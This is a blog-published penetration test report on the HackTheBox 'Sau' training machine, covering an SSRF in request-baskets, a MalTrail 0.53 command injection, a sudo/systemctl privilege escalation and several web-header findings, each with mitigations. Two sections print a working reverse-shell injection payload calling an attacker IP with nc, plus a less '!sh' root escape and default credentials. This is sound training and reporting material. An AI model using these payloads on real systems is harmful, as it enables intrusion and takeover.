---
layout: post
title:  "HackTheBox Sau Report"
date:   2024-06-12
categories:
  - cyber
  - report
comments: true
---

HackTheBox "Sau" Machine  
Penetration Test Report

Patrick Double  
pat@patdouble.com  
https://www.linkedin.com/in/patrick-double-28b44149/
<div class="page-break" style="page-break-before: always;"></div>

```table-of-contents
title: **Table of Contents**
```
<div class="page-break" style="page-break-before: always;"></div>

# Executive Summary

## Purpose and Scope

"Sau is an Easy Difficulty Linux machine that features a Request Baskets instance  ..."
- https://app.hackthebox.com/machines/Sau

The goal was to identify security vulnerabilities within the machine, exploit the vulnerabilities to retrieve flags `user.txt` and  `root.txt`, and identify mitigations.

## Risks
### Full System Compromise (High Impact)
A full system compromise provides a computer under attacker control in the network.

### Modification of Sensitive Application
**Maltrail** is a malicious traffic detection system. An attacker could change configuration or disable the application such that malicious traffic is no longer detected.

## Recommendations

This section gives general recommendations that will reduce the risk of the findings occurring in the future. Recommendations specific to each finding are detailed in the next section.

### Regular Patching
A regular patching schedule should be maintained for all installed software.

### Password Requirements
Strong password requirements should be enforced.

### Vulnerability Scanning
Using a vulnerability scanner on deployment environments may find configuration errors, such as several of the HTTP cookie and header findings detailed below.

# Findings

| Finding ID     | [CWE](https://cwe.mitre.org/)                            | Risk/<br>Impact | Description                              |
| -------------- | -------------------------------------------------------- | --------------- | ---------------------------------------- |
| HTBSAU-2024-01 | [918](https://cwe.mitre.org/data/definitions/918.html)   | High/High       | CVE-2023-27163 SSRF in request-baskets   |
| HTBSAU-2024-02 | [77](https://cwe.mitre.org/data/definitions/77.html)     | High/High       | MalTrail 0.53 Command Injection RCE      |
| HTBSAU-2024-03 | [205](https://cwe.mitre.org/data/definitions/250.html)   | High/High       | CVE-2023-26604 Privilege Escalation      |
| HTBSAU-2024-04 | [1392](https://cwe.mitre.org/data/definitions/1392.html) | HIgh/Medium     | MailTrail Default Credentials            |
| HTBSAU-2024-05 | [352](https://cwe.mitre.org/data/definitions/352.html)   | Medium/Medium   | Missing CSRF Token                       |
| HTBSAU-2024-06 | [693](https://cwe.mitre.org/data/definitions/693.html)   | Medium/Medium   | CSP: Unsafe Configuration                |
| HTBSAU-2024-07 | [693](https://cwe.mitre.org/data/definitions/693.html)   | Medium/Medium   | Missing Content Security Policy Header   |
| HTBSAU-2024-08 | [345](https://cwe.mitre.org/data/definitions/345.html)   | Medium/Medium   | Sub Resource Integrity Attribute Missing |
| HTBSAU-2024-09 | [829](https://cwe.mitre.org/data/definitions/829.html)   | Medium/Medium   | Vulnerable JS Library: moment.js 2.10.6  |
| HTBSAU-2024-10 | [1021](https://cwe.mitre.org/data/definitions/1021.html) | Low/Medium      | Missing Anti-clickjacking Header         |

## HTBSAU-2024-01 CVE-2023-27163 SSRF in request-baskets
### Observation
The request-baskets 1.2.1 application has a known vulnerability that the tester successfully exploited.

### Affected Components
- Web Application at http://sau.htb:55555

### Description
"request-baskets up to v1.2.1 was discovered to contain a Server-Side Request Forgery (SSRF) via the component /api/baskets/{name}. This vulnerability allows attackers to access network resources and sensitive information via a crafted API request."
- NVD, https://nvd.nist.gov/vuln/detail/CVE-2023-27163

The tester succeeded in gaining access to an internal web service running on the default HTTP port. Any HTTP service accessible to the `sau.htb` machine, including those not accessible to the public Internet, could be accessed using this vulnerability.

### Mitigation
Upgrade request-baskets to a patched version.

### Validation
Create a new basket and configure it to forward to `http://localhost:80`. Verify the MalTrail application is not available.

![](/assets/attachments/Pasted%20image%2020240627161409.png)

![](/assets/attachments/Pasted%20image%2020240627164658.png)

### References
- https://nvd.nist.gov/vuln/detail/CVE-2023-27163
- https://cwe.mitre.org/data/definitions/918.html
- https://medium.com/@li_allouche/request-baskets-1-2-1-server-side-request-forgery-cve-2023-27163-2bab94f201f7

## HTBSAU-2024-02 MalTrail 0.53 Command Injection RCE
### Observation
The MalTrail application was exposed through the SSRF vulnerability described in HTBSAU-2024-01. MalTrail is running a vulnerable version of 0.53 that allows remote code execution (RCE) via command injection.

### Affected Components
- Web application on sau.htb running on `http://localhost:80/`

### Description
"Command injection vulnerabilities typically occur when:
1. Data enters the application from an untrusted source.
2. The data is part of a string that is executed as a command by the application.
3. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have."
- https://cwe.mitre.org/data/definitions/77.html

The tester was able to execute arbitrary operating system commands leading to a reverse shell.

### Mitigation
Upgrade MalTrail to a patched version.

### Validation
1. Configure a basket detailed in HTBSAU-2024-01
2. On the attacking machine run `nc -nlvp 9090`
3. On another shell on the attacking machine run, changing the bucket name and attacker IP address.
```shell
   curl 'http://sau.htb:55555/mfaos3m/login' --data 'username=;`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%25261|nc 10.10.14.87 9090 >/tmp/f`'
```
4. A vulnerable version will connect back to the `nc` command
```shell
$ nc -nlvp 9090
listening on [any] 9090 ...
connect to [10.10.14.87] from (UNKNOWN) [10.129.229.26] 56694
/bin/sh: 0: can't access tty; job control turned off
$
```

### References
- https://cwe.mitre.org/data/definitions/77.html
- https://huntr.com/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/

## HTBSAU-2024-03 CVE-2023-26604 Privilege Escalation
### Observation
The Ubuntu operating system on `sau.htb` is running an unpatched version. The version has vulnerability CVE-2023-26604 that affects system services run using `sudo`.

### Affected Components
 - Ubuntu 20.04.6 LTS on `sau.htb`

### Description
The `puma` user was compromised by HTBSAU-2024-02. This user is allowed to run the following command:
```shell
$ sudo /usr/bin/systemctl status trail.service
```

When the output needs to be paged, the `less` program is used. This program allows command execution, and it is running as the `root` user.

### Mitigation
Upgrade Ubuntu to a patched version.

### Validation
1. Login as the `puma` user
2. Execute the following commands:
```shell
$ stty columns 200 rows 10
$ sudo /usr/bin/systemctl status trail.service
!sh
```
3. On a vulnerable system, the `!sh` input to the `less` program will result in a shell
```shell
!sh
# id
uid=0(root) gid=0(root) groups=0(root)
#
```

### References
- https://ubuntu.com/security/CVE-2023-26604

## HTBSAU-2024-04 MailTrail Default Credentials
### Observation
The MalTrail application was exposed through the SSRF vulnerability described in HTBSAU-2024-01. It is configured with default credentials for the `admin` account.

### Affected Components
- Web application on sau.htb running on `http://localhost:80/

### Description
"It is common practice for products to be designed to use default keys, passwords, or other mechanisms for authentication. The rationale is to simplify the manufacturing process or the system administrator's task of installation and deployment into an enterprise. However, if admins do not change the defaults, it is easier for attackers to bypass authentication quickly across multiple organizations."
 - https://cwe.mitre.org/data/definitions/1392.html

### Mitigation
Change the password for the `admin` user as part of the install process. Create a password rotation policy to mitigate compromise of the password.

### Validation
1. Configure a basket detailed in HTBSAU-2024-01
2. Open a web browser to the basket URL
3. Enter the user `admin` and password `changeme!` and click `Log In`
4. A vulnerable password will successfully login

### References
- https://cwe.mitre.org/data/definitions/1392.html

## HTBSAU-2024-05 Missing CSRF Token
### Observation
The tester observed the web application on port 55555 does not use a CSRF (Cross-Site Request Forgery) token.

![](/assets/attachments/93de6dcf582e911bba92cc8df519fdd0_MD5.jpeg)

### Affected Components
- Web application on port 55555

### Description
"When a web server is designed to receive a request from a client without any mechanism for verifying that it was intentionally sent, then it might be possible for an attacker to trick a client into making an unintentional request to the web server which will be treated as an authentic request. This can be done via a URL, image load, XMLHttpRequest, etc. and can result in exposure of data or unintended code execution."
- https://cwe.mitre.org/data/definitions/352.html

### Mitigation
If the alert is present after upgrading request-baskets, contact the authors and request implementation of CSRF protection.

### Validation
Use a web application scanner to detect the presence of CSRF protection. Use a web application proxy, such as ZAP, to intercept requests and modify the CSRF token. Proper implementation will fail to process the request if the CSRF is modified.

### References
- https://cwe.mitre.org/data/definitions/352.html

## HTBSAU-2024-06 Content Security Policy: Unsafe Configuration
### Observation
The request-baskets 1.2.1 software has an unsafe content security policy:
- Wildcard Directive
- script-src unsafe-eval
- style-src unsafe-inline

![](/assets/attachments/26e0c7b8a7312a844f200aab3804bcb9_MD5.jpeg)

### Affected Components
- Web application on port 55555

### Description
"**Content Security Policy** ([CSP](https://developer.mozilla.org/en-US/docs/Glossary/CSP)) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross-Site Scripting ([XSS](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)) and data injection attacks. These attacks are used for everything from data theft, to site defacement, to malware distribution."
- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

### Mitigation
If the alert is present after upgrading request-baskets, contact the authors and request implementation of a more strict CSP.

### Validation
Use a web application scanner to detect the unsafe configuration.

### References
- https://cwe.mitre.org/data/definitions/693.html
- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

## HTBSAU-2024-07 Missing Content Security Policy Header
### Observation
The tester observed the web application does not provide a CSP (Content Security Policy) in some cases.

![](/assets/attachments/9f4329385ffc6193847bfe84be643815_MD5.jpeg)

### Affected Components
- Web application on port 55555

### Description
"**Content Security Policy** ([CSP](https://developer.mozilla.org/en-US/docs/Glossary/CSP)) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross-Site Scripting ([XSS](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)) and data injection attacks. These attacks are used for everything from data theft, to site defacement, to malware distribution."
- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

### Mitigation
If the alert is present after upgrading request-baskets, contact the authors and request including a proper CSP header for every request.

### Validation
The Firefox dev tools can be used to inspect the response of requests to the applications. Look for the `Content-Security-Policy` HTTP headers.

### References
- https://cwe.mitre.org/data/definitions/693.html
- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

## HTBSAU-2024-08 Sub Resource Integrity Attribute Missing

### Observation

![](/assets/attachments/f08b90f3f519772996bd0eecefdf1ca9_MD5.jpeg)

### Affected Components
- Web application on port 55555

### Description
"**Subresource Integrity** (SRI) is a security feature that enables browsers to verify that resources they fetch (for example, from a [CDN](https://developer.mozilla.org/en-US/docs/Glossary/CDN)) are delivered without unexpected manipulation. It works by allowing you to provide a cryptographic hash that a fetched resource must match."
- https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity

### Mitigation
If the alert is present after upgrading request-baskets, contact the authors and request use of sub-resource integrity attributes.

### Validation
Use a web application scanner to detect missing sub-resource integrity attributes.

### References
- https://cwe.mitre.org/data/definitions/345.html
- https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity

## HTBSAU-2024-09 Vulnerable JS Library: moment.js 2.10.6
### Observation
The client side dependency moment.js is a vulnerable version.

![](/assets/attachments/166f275409e8ca31ad0b0ba7417d7051_MD5.jpeg)

### Affected Components
- Web application on port 55555

### Description
"When including third-party functionality, such as a web widget, library, or other source of functionality, the product must effectively trust that functionality. Without sufficient protection mechanisms, the functionality could be malicious in nature (either by coming from an untrusted source, being spoofed, or being modified in transit from a trusted source). The functionality might also contain its own weaknesses, or grant access to additional functionality and state information that should be kept private to the base system, such as system state information, sensitive application data, or the DOM of a web application."
 - https://cwe.mitre.org/data/definitions/829.html

### Mitigation
If the alert is present after upgrading request-baskets, contact the authors and request upgrading the moment.js dependency.

### Validation
Use a web application scanner to detect vulnerable client side dependencies.

### References
- https://cwe.mitre.org/data/definitions/829.html

## HTBSAU-2024-10 Missing Anti-clickjacking Header
### Observation
The tester observed lack of HTTP headers mitigating click jacking attacks.

![](/assets/attachments/adbcfbc7620c58852958e93620af64f5_MD5.jpeg)
### Affected Components
- Web application on port 55555

### Description
"Clickjacking (classified as a user interface redress attack or UI redressing) is a malicious technique of tricking a user into clicking on something different from what the user perceives, thus potentially revealing confidential information or allowing others to take control of their computer "
- https://en.wikipedia.org/wiki/Clickjacking

### Mitigation
For the custom application on port 8080, implement a CSP including `frame-ancestors` or the `X-Frame-Options` header.

### Validation
The Firefox dev tools can be used to inspect the response of requests to the applications. Look for the `frame-ancestors` value in the `Content-Security-Policy` HTTP header, or the `X-Frame-Options` header.

### References
- https://en.wikipedia.org/wiki/Clickjacking
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options

# Methodology

The tester employed an industry recognized method for conducting penetration testing. Below is a detailed account of how the tester identified and exploited the target, including all individual vulnerabilities discovered.

## Discovery

The IP address for this machine is `10.129.44.233`. The typical host name for Hack the Box machines is the name of the machine and a TLD of `htb`. Add this to `/etc/hosts` as:
```
10.129.44.233 sau.htb
```

### Service Enumeration

The tester enumerated network services using `nmap`.
```shell
$ nmap -p- -sV -sC -oN nmap-tcp-all.txt -oX nmap-tcp-all.xml 10.129.44.233
```

The interesting services are:

| Port  | Service | Product                         |
| ----- | ------- | ------------------------------- |
| 22    | ssh     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 |
| 55555 | http    | unknown                         |

### TCP 55555 HTTP

To prepare for enumerating the http endpoints, the tester started and configured ZAP to intercept and inspect traffic.

![](/assets/attachments/Pasted%20image%2020240627134042.png)


![](/assets/attachments/Pasted%20image%2020240627134105.png)

![](/assets/attachments/Pasted%20image%2020240627153501.png)

The web application is running request-baskets version 1.2.1.

The tester verified a new basket can be created.

![](/assets/attachments/Pasted%20image%2020240627155831.png)

![](/assets/attachments/Pasted%20image%2020240627155906.png)

## Vulnerabilities

### SSRF in request-baskets, CVE-2023-27163

By performing a search, the tester found a CVE in request-baskets version 1.2.1.

- https://nvd.nist.gov/vuln/detail/CVE-2023-27163
- https://medium.com/@li_allouche/request-baskets-1-2-1-server-side-request-forgery-cve-2023-27163-2bab94f201f7

Configuring the basket to forward to `http://localhost:80/` revealed the MalTrail login page.

![](/assets/attachments/Pasted%20image%2020240627161409.png)

![](/assets/attachments/Pasted%20image%2020240627164658.png)

### Default Credentials

The tester searched for any default credentials for MalTrail and found `admin:changeme!`. The credentials worked. The forwarding interfered with optimal usage of the application.

![](/assets/attachments/Pasted%20image%2020240628051117.png)

![](/assets/attachments/Pasted%20image%2020240628051406.png)

### MalTrail 0.53 RCE

A search for exploits for MalTrail 0.53 revealed a remote code execution exploit.

![](/assets/attachments/Pasted%20image%2020240628051510.png)

https://huntr.com/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/

![](/assets/attachments/Pasted%20image%2020240628051644.png)

## Exploitation

### MalTrail 0.53 RCE

The bucket name `mfaos3m` will need to be changed to match the one created above.

```shell
$ nc -nlvp 9090

$ curl 'http://sau.htb:55555/mfaos3m/login' --data 'username=;`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%25261|nc 10.10.14.87 9090 >/tmp/f`'

$ nc -nlvp 9090
listening on [any] 9090 ...
connect to [10.10.14.87] from (UNKNOWN) [10.129.229.26] 56694
/bin/sh: 0: can't access tty; job control turned off
$
```

The `user.txt` file is found in this user's home directory.

```shell
$ whoami
puma
$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b0:a0:f6 brd ff:ff:ff:ff:ff:ff
    inet 10.129.229.26/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 2299sec preferred_lft 2299sec
    inet6 dead:beef::250:56ff:feb0:a0f6/64 scope global dynamic mngtmpaddr 
       valid_lft 86394sec preferred_lft 14394sec
    inet6 fe80::250:56ff:feb0:a0f6/64 scope link 
       valid_lft forever preferred_lft forever
$ hostname
sau
$ cd
$ pwd
/home/puma
$ ls
user.txt
```

## Discovery of `puma@sau.htb`

The tester stabilized the shell for easier discovery.

```shell
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
puma@sau:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
<l/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
puma@sau:~$ export TERM=xterm-256color
export TERM=xterm-256color
puma@sau:~$ ^Z
zsh: suspended  nc -nlvp 9090

┌──(kali㉿kali)-[~/…/Assessments/hackthebox/pwned.d/Sau]
└─$ stty raw -echo ; fg ; reset
[1]  + continued  nc -nlvp 9090
stty columns 200 rows 200
puma@sau:~$
```

The operating system is Ubuntu 20.04.6.
```shell
puma@sau:~$ cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.6 LTS"
```

The `puma` user has sudo permissions:
```shell
puma@sau:~$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

## Vulnerabilities

https://ubuntu.com/security/cves

### CVE-2023-26604

![](/assets/attachments/d4787db7f0075b6a2b7ebbcb6d437a7e_MD5.jpeg)


![](/assets/attachments/d30dfaae50c99fab052b892306954b9f_MD5.jpeg)

https://ubuntu.com/security/CVE-2023-26604

![](/assets/attachments/e9d85638f678c2b66cf81f543a9bc235_MD5.jpeg)

## Exploitation of `systemctl`

![](/assets/attachments/8a96831adc03230dd0ac3a4561147bd7_MD5.jpeg)


![](/assets/attachments/742b2f7596505bfd59c6a4d51d637707_MD5.jpeg)


```shell
# id
uid=0(root) gid=0(root) groups=0(root)
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b0:a0:f6 brd ff:ff:ff:ff:ff:ff
    inet 10.129.229.26/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 2323sec preferred_lft 2323sec
    inet6 dead:beef::250:56ff:feb0:a0f6/64 scope global dynamic mngtmpaddr 
       valid_lft 86395sec preferred_lft 14395sec
    inet6 fe80::250:56ff:feb0:a0f6/64 scope link 
       valid_lft forever preferred_lft forever
# hostname
sau
# cd
# ls
go  root.txt
#
```


# Appendix

## Tool Versions

| Tool       | Version           | Source                            |
| ---------- | ----------------- | --------------------------------- |
| Kali Linux | 2024.2            | https://www.kali.org/get-kali/    |
| Firefox    | 115.12.0esr       | Kali package manager              |
| ZAP        | Weekly 2024-06-17 | https://www.zaproxy.org/download/ |
| nmap       | 7.94SVN           | Kali package manager              |
| curl       | 8.8.0             | Kali package manager              |
| netcat     | v1.10-48.1        | Kali package manager              |
